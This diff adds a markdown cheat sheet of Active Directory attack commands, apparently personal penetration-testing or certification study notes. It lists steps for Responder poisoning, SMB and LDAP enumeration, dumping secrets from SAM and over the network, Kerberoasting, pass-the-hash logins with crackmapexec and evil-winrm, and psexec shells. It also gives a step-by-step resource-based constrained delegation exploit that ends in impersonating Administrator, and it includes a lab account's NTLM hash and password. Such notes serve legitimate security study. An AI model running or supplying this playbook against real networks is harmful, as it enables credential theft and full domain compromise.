@@ -1,0 +1,82 @@
+- Non Credentialed
+	- Responder
+		- sudo responder -I ens224 -A
+	- LDAP
+	- SMB/ RPC
+		- crackmapexec smb IP --users
+		- enum4linux $IP
+	- Secrets dump
+		- Local
+			- impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+- Credentialed
+	- Kerberoast
+		- sudo impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC-IP -request
+	- Secrets dump
+		- Password
+			- impacket-secretsdump USER:PASS@$IP
+		- NTLM Hash
+			- impacket-secretsdump -hashes ':NTLM' USER@$IP
+	- SMB
+		- Password
+			- crackmapexec smb $IP -u USER -p PASS --shares
+		- NTLM Hash
+			- crackmapexec smb $IP -u USER -H 'NTLM' --shares
+		- If C$ writable
+			- impacket-psexec DOMAIN/USER:'PASS'@$IP
+	- Winrm
+		- Password
+			- crackmapexec winrm $IP -u USER -p PASS
+		- NTLM Hash
+			- crackmapexec winrm $IP -u USER -H 'NTLM'
+		- Connect
+			- Password
+				- evil-winrm -i $IP -u USER -p PASS
+			- NTLM
+				- evil-winrm -i $IP -u USER -H NTLM
+	- RDP
+		- xfreerdp /v:$IP /u:USER /p:PASS
+	- LDAP
+		- Password
+			- `ldapdomaindump ldap://$DC-IP -u 'DOMAIN\USER' -p 'PASS'
+		- Certificates
+			- certipy-ad find -username USER@DOMAIN.com -password 'PASS' -dc-ip $DC-IP -debug -scheme ldap
+	- Bloodhound
+		- Sharphound (must have shell)
+			- Move exe to target
+			- SharpHound.exe -c All --zipfilename FILENAME
+			- Move zip to attack machine
+	- Resourced Constrained Delegation Access
+		- Check if exploitable
+			- . ./PowerView.ps1
+			- Check access:  
+				- Get-DomainObject -Identity "dc=resourced,dc=local" -Domain resourced.local
+					- ms-ds-machineaccountquota  is set to 10
+			- DC must be over Win Server 12:
+				- Get-DomainController
+		- Exploit
+			- Windows
+				- . ./Powermad.ps1
+				- `New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+					- Returns information about the account (samaccountname and distinguished)
+				- Get the SID - Get-DomainComputer fake01
+					- Copy down the SID of account
+				- Powerview Exploit method
+					- `$ComputerSid = Get-DomainComputer fake01 -Properties objectsid | Select -Expand objectsid
+					- `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+					- `$SDBytes = New-Object byte[] ($SD.BinaryLength)
+					- `$SD.GetBinaryForm($SDBytes, 0)
+					- `Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+					- `Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+						- Returns: {1, 0, 4, 128...}
+					- ![[Pasted image 20240809113302.png]]
+				- After PowerView
+					- `.\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:domain.local
+			- Linux
+				- `impacket-addcomputer resourced.local/l.livingstone -dc-ip $DC-IP -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'r4j3sh$' -computer-pass 'Rajesh@Mondal'
+				- `rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "r4j3sh$" -dc-ip $DC-IP -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
+				- `impacket-getST -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/r4j3sh\\$:'Rajesh@Mondal' -dc-ip $DC-IP
+				- `export KRB5CCNAME=$PWD/Administrator.ccache
+				- klist
+					- see cache ticket
+					- Add the dc name to /etc/hosts
+				- `impacket-psexec -dc-ip $DC-IP -k -no-pass resourcedc.resourced.local
